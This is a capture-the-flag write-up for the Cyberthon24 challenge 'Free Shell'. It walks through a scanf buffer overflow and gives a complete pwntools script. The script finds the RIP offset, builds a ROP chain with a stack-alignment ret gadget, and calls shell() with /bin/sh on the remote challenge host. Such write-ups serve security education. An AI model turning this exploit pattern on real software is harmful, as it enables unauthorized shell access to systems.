# Free Shell

## Problem Statement

Want a shell? Just give it a call! You'll need to provide the command though.

Interact with the service at: `chals.t.cyberthon24.ctf.sg:33041`

Concept(s) Required:

- [Buffer Overflow to overwrite RIP](https://guyinatuxedo.github.io/05-bof_callfunction/csaw18_getit/index.html)
- [Using Return Oriented Programming to pass x64 parameters](https://www.youtube.com/watch?v=abEOdicWhNo)

Note: once you get a shell, the flag.txt can be found in the user's home directory.

## Solution

Inspecting the source file,

```c
const char *BIN_SH = "/bin/sh\x00";

void shell(char **cmd)
{
    if (!strcmp(*cmd, BIN_SH))
    {
        system(*cmd);
    }
    else
    {
        puts("Try calling system(\"/bin/sh\").");
    }
}

int main()
{
    char input[64];

    ...
    
    scanf("%s", input);

    return 0;
}
```

The source code defines a `shell()` function that takes a command as an argument. If the provided command matches the
address of a string "/bin/sh", it gives us shell.

Since the `scanf()` function does not perform bounds checking, it is susceptible to buffer overflow. By providing input
longer than the buffer size, we can overwrite memory, including the return address on the stack, and the arguments of
functions.

So we want to construct a payload that includes padding to fill the buffer, the address of the `shell()` function, and
the
address of "/bin/sh" as the argument. This is known as Return Oriented Programming (ROP).

First we find the offset to start overriding the instruction the pointer, which will be the length of our padding. We
can use `pwntools` or `gdb`, but I will demonstrate using `pwntools` here.

```python
from pwn import *

elf = context.binary = ELF("./free_shell", checksec=False)

p = process()
p.sendlineafter(b'=> ', cyclic(100))
p.wait()

offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
log.success("IP Offset: {}".format(offset))
```

Now, we have to create a ROP chain that will execute the `shell()` function with the correct arguments. First, we need
to find the address of the global variable `*BIN_SH`, as that will be the argument we pass into `shell()`. We can do so
using GDB.

```shell
> gdb free_shell
...
> info variables
All defined variables:

Non-debugging symbols:
...
0x0000000000601010  BIN_SH
...
```

We find the value to be `0x601010`. Now, we use `pwntools` to create the ROP chain

```python
p = process()

rop = ROP(elf)
rop.call('shell', [0x601010])
payload = flat({offset: rop.chain()})
p.sendlineafter(b'=> ', payload)

p.interactive()
```

Hmm, we get a segmentation fault for some reason:

```
[*] Process 'free_shell' stopped with exit code -11 (SIGSEGV)
[*] Got EOF while sending in interactive
```

It turns out that it is an issue with stack alignment.
This excerpt from [https://ropemporium.com/guide.html](https://ropemporium.com/guide.html) explains the reason.

"If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then
ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of
GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires
the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution,
causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection
fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function
or return further into a function to skip a push instruction."

Basically, we just have to add an extra `ret` gadget. Our final code now looks like this:

```python
from pwn import *

elf = context.binary = ELF("./free_shell", checksec=False)

p = process()
p.sendlineafter(b'=> ', cyclic(100))
p.wait()

offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
log.success("IP Offset: {}".format(offset))

rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
rop.call(ret_gadget)
rop.call('shell', [0x601010])
payload = flat({offset: rop.chain()})

r = remote("chals.t.cyberthon24.ctf.sg", 33041)
r.sendlineafter(b'=> ', payload)
r.sendline(b'cat ~/flag.txt')

r.interactive()
```